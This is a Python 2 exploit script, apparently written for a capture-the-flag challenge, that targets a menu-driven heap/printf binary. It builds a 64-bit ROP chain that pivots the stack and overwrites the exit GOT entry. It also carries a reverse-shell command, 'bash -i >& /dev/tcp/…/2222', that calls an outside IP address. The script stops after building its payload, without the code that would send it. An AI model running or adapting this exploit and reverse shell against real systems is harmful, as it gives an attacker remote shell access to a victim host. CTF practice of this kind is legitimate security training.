__author__ = 'HuyNA'
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib

#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0x99)
    return decode_string

def write_entry(f, index, data):
    f.write('2\n')
    f.write(str(index) + '\n')
    f.write(str(len(data)) + '\n')
    f.write(data)
    assert f.readline().strip() == 'OK'

def free_entry(f, index):
    f.write('3\n')
    f.write(str(index) + '\n')
    assert f.readline().strip() == 'OK'

def printf_entry(f, index, delim='END\n'):
    f.write('3\n')
    f.write(str(index) + '\n')
    resp = readuntil(f, delim)[:-len(delim)]
    assert f.readline().strip() == 'OK'
    return resp

def do_printf(f, index, fmt):
    write_entry(f, index, fmt + 'END\n\0')
    return printf_entry(f, index)

def allocate_entry(f, length):
    f.write('1\n')
    f.write(str(length) + '\n')
    index = int(f.readline())
    assert f.readline().strip() == 'OK'
    return index

def strlen_entry(f, index):
    f.write('4\n')
    f.write(str(index) + '\n')
    msg = f.readline().strip()
    assert f.readline().strip() == 'OK'
    return msg

def final_interact():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#  grandprix.whitehat.vn:6007
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#s.connect(('grandprix.whitehat.vn', 6007))
s.connect(('127.0.0.1', 2307))
connect_back_shellcode = '\x90'*90



exit_address = 0x04004E0
exit_got_address = 0x00600B58
new_stack = 0x600C00
pop_esp = 0x0040073d
junk = 0x4141414141414141

add_byte = 0x00400733 # : add byte [rbp+0x1B], dh ; add rsp, 0x18 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret  ;
set_edx = 0x004007a0 #: mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword [r12+rbx*8] ;  (1 found)
set_rbx_r13_12 = 0x0040073a # : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret  ;  (1 found)
set_rdi = 0x004007c3 # : pop rdi ; ret  ;  (1 found)
pop_ret = 0x00400630 #: pop rbp ; ret  ;  (1 found)
pointer_pop_ret = 0x00600BD0

pointer_command = 0x00600BD0 + 0x200
command = 'bash -i >& /dev/tcp/103.1.209.105/2222 0>&1'

rop1 = [
    pop_esp,
    new_stack,
    junk,
    ]

rop2 = [
    set_rbx_r13_12,
    0,
    junk,
    pointer_pop_ret,
    0xb0,
    set_edx,

    pop_ret,
    exit_got_address-0x1b,
    junk,
    junk,
    junk,
    0,          # rbx
    junk,       # rac
    pointer_pop_ret,
    0xa4,       # r13
    set_edx,

    pop_ret,
    exit_got_address-0x1b+1,
    junk,
    junk,
    junk,
    junk,
    junk,
    junk,
    junk,

    set_rdi,
    pointer_command,
    exit_address
]


delta_to_puts = 0x00600BC0 - 0x0600B50 + 2
address_overwrite = pop_esp - 0x0
data = pq(delta_to_puts) + pq(address_overwrite) + command